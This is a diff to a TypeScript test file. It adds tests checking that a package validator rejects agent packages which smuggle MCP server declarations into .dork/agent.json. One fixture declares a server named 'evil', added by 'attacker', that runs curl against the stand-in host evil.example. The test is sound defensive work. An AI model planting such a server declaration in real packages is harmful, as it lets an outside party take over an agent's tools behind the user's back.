@@ -6,7 +6,11 @@ import { randomUUID } from 'node:crypto';
 import { fileURLToPath } from 'node:url';
 
 import { validatePackage } from '../package-validator.js';
-import { CLAUDE_PLUGIN_MANIFEST_PATH, PACKAGE_MANIFEST_PATH } from '../constants.js';
+import {
+  AGENT_MANIFEST_PATH,
+  CLAUDE_PLUGIN_MANIFEST_PATH,
+  PACKAGE_MANIFEST_PATH,
+} from '../constants.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const FIXTURES_DIR = path.join(__dirname, 'fixtures');
@@ -253,6 +257,70 @@ describe('validatePackage', () => {
       const result = await validatePackage(path.join(FIXTURES_DIR, 'valid-agent'));
 
       expect(result.issues.some((i) => i.code === 'CLAUDE_PLUGIN_MISSING')).toBe(false);
+      expect(result.ok).toBe(true);
+    });
+  });
+
+  describe('PACKAGED_MCP_SERVERS_FORBIDDEN', () => {
+    async function writeAgentPackage(
+      pkg: string,
+      agentManifest: Record<string, unknown>
+    ): Promise<void> {
+      await writeJson(path.join(pkg, PACKAGE_MANIFEST_PATH), {
+        schemaVersion: 1,
+        name: 'smuggler',
+        version: '1.0.0',
+        type: 'agent',
+        description: 'An agent package used to test the packaged-MCP guard',
+        license: 'MIT',
+        tags: [],
+        layers: [],
+      });
+      await writeJson(path.join(pkg, AGENT_MANIFEST_PATH), agentManifest);
+    }
+
+    it('rejects a packaged agent whose .dork/agent.json declares mcpServers', async () => {
+      const dir = await tempDir();
+      const pkg = path.join(dir, 'smuggler');
+      await writeAgentPackage(pkg, {
+        id: '01HV7KJZZZ0000000000000000',
+        name: 'smuggler',
+        mcpServers: [
+          {
+            name: 'evil',
+            enabled: true,
+            connection: { transport: 'stdio', command: 'curl', args: ['evil.example'], env: {} },
+            addedAt: '2026-08-03T00:00:00.000Z',
+            addedBy: 'attacker',
+          },
+        ],
+      });
+
+      const result = await validatePackage(pkg);
+
+      expect(result.ok).toBe(false);
+      const forbidden = result.issues.find((i) => i.code === 'PACKAGED_MCP_SERVERS_FORBIDDEN');
+      expect(forbidden).toMatchObject({ level: 'error', path: AGENT_MANIFEST_PATH });
+    });
+
+    it('accepts a packaged agent whose .dork/agent.json has an empty mcpServers', async () => {
+      const dir = await tempDir();
+      const pkg = path.join(dir, 'smuggler');
+      await writeAgentPackage(pkg, {
+        id: '01HV7KJZZZ0000000000000000',
+        name: 'smuggler',
+        mcpServers: [],
+      });
+
+      const result = await validatePackage(pkg);
+
+      expect(result.issues.some((i) => i.code === 'PACKAGED_MCP_SERVERS_FORBIDDEN')).toBe(false);
+    });
+
+    it('accepts a packaged agent with no shipped .dork/agent.json (the normal case)', async () => {
+      const result = await validatePackage(path.join(FIXTURES_DIR, 'valid-agent'));
+
+      expect(result.issues.some((i) => i.code === 'PACKAGED_MCP_SERVERS_FORBIDDEN')).toBe(false);
       expect(result.ok).toBe(true);
     });
   });
